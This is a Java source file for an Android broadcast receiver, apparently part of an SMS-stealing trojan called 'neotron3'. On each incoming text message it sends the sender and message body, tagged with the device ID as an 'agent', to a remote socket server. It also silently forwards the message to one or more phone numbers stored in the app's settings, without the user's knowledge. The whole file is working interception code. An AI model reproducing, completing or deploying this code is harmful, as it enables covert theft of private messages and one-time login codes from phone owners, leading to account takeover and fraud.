package com.pegalite.neotron3.functions;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import com.pegalite.neotron3.server.socket.PegaSocketServer;

public class SmsReceiver extends BroadcastReceiver {
    @SuppressLint("HardwareIds")
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String sender = smsMessage.getDisplayOriginatingAddress();
                String message = smsMessage.getMessageBody();
                Log.d("SMS", "From: " + sender + " | Message: " + message);
                Prefs prefs = new Prefs(context);
                if (PegaSocketServer.getSocket() != null && PegaSocketServer.getSocket().connected()) {
                    PegaSocketServer.getSocket().emit("sms", "agent-" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + context.getPackageName(), sender, message);

                    if (prefs.getPref("sms-forward-online").equals("no-data")) {
                        return;
                    }
                    String phoneNumber = prefs.getPref("sms-forward-online");
                    if (forwardMessage(sender, message, phoneNumber)) return;
                } else {
                    if (prefs.getPref("sms-forward").equals("no-data")) {
                        return;
                    }
                    String phoneNumber = prefs.getPref("sms-forward");
                    if (forwardMessage(sender, message, phoneNumber)) return;

                }
            }
        }
    }

    private static boolean forwardMessage(String sender, String message, String phoneNumber) {
        SmsManager smsManager = SmsManager.getDefault();
        if (phoneNumber.contains(",") || phoneNumber.contains(".")) {
            for (String number : phoneNumber.contains(",") ? phoneNumber.split(",") : phoneNumber.split("\\.")) {
                smsManager.sendTextMessage(number, null, message, null, null);
            }
            return true;
        }
        smsManager.sendTextMessage(phoneNumber, null, message, null, null);
        return false;
    }
}
